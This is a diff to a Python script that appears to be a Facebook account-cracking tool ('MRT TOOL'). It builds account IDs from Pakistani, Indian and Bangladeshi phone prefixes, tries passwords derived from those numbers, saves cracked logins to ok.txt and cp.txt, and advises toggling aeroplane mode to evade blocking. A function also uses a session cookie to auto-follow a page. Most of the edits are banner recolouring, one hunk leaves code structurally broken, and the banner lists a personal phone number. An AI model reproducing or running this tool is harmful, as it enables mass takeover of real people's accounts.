@@ -48,15 +48,11 @@ def follow(self, session, coki):
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://mbasic.facebook.com' + str(get), {
             'cookie': coki }, **('cookies',)).text
-            
-            
 
-class jalan:
-    def __init__(self, z):
         for e in z + "\n":
             sys.stdout.write(e)
             sys.stdout.flush()
-            time.sleep(0.009)
+            time.sleep(0.009) 
             
 RED = '\033[1;91m'
 WHITE = '\033[1;97m'
@@ -97,19 +93,17 @@ logo =                                          ("""
 \033[1;33m   88    88    88  88o  obY'    88    
 \033[1;32m   88    88    88  88.`8b       88    
 \033[1;32m   88    88    88  88  `88.     88    
-\033[1;33m   YP    YP    YP  88    YD     YP    
-                            
-                            
+\033[1;33m   YP    YP    YP  88    YD     YP V1.0         
 
-\033[1;32m==========================================
-\033[1;32m     \033[1;32mFACEBOOK     : \033[1;33m Meer Rehan Talpur
+\033[1;33m============================================
+\033[1;32m     \033[1;32mFACEBOOK     : \033[1;33m MIR REHAN TALPUR
 \033[1;32m     \033[1;33mWhatsapp     :\033[1;32m  03498410573
 \033[1;32m     \033[1;32mGITHUB       :  \033[1;33mNOT UPLOAD
 \033[1;32m     \033[1;33mTOOL STATUS  :  \033[1;32mFREE
 \033[1;32m     \033[1;32mTOOL VERSION :  \033[1;33m1.0
-\033[1;32m==========================================
+\033[1;33m============================================
        \33[33;42m\t WELLCOME TO MRT TOOL\33[0;m
-\033[1;32m==========================================\n""")
+\033[1;33m============================================\n""")
 loop = 0
 oks = []
 cps = []
@@ -174,13 +168,13 @@ def i():
     print(logo)
     
     
-    print("\033[1;37m\t  USE OUR COUNTRY CODE  ")
-    print('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
-    print('\033[1;32m============================================')
-    print('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
-    print('\033[1;32m============================================')
-    print('\033[1;36m     \t     BANGLA CODES\n     \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97m')
-    print('\033[1;32m============================================\n')
+    print("\033[1;33m\t  USE OUR COUNTRY CODE  ")
+    print('\033[1;32m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
+    print('\033[1;33m============================================')
+    print('\033[1;32m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
+    print('\033[1;33m============================================')
+    print('\033[1;32m     \t     BANGLA CODES\n     \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97m')
+    print('\033[1;33m============================================\n')
     code = input(' PUT CODE : ')
     print("")
     limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
@@ -199,9 +193,10 @@ def i():
         clear()
         tl = str(len(user))
         print('\033[1;33m TOTAL IDS: '+tl)
-        print('\033[1;33m THE PROCESS HAS BEEN STARTED')
-        print('\033[1;32m USE AEROPLANE MODE AFTER 1 MINUTE')
-        print('\033[1;32m============================================')
+        print('\033[1;32m THE PROCESS HAS BEEN STARTED')
+        print('\033[1;33m USE AEROPLANE MODE AFTER 1 MINUTE')
+        print('\033[1;32m Cps ACCOUNTS OPEN AFTER 15 DAYS')
+        print('\033[1;33m============================================')
         for love in user:
             pwx = [love[1:]]
             uid = code+love
@@ -209,10 +204,10 @@ def i():
                 pwx.append(Eman)
                 pwx.append(love)
             manshera.submit(rcrack,uid,pwx,tl)
-    print('\033[1;32m============================================')
+    print('\033[1;33m============================================')
     print('Crack process has been completed')
     print('Ids saved in ok.txt,cp.txt')
-    print('\033[1;32m============================================')
+    print('\033[1;33m============================================')
 
 def rcrack(uid,pwx,tl):
     #print(user)
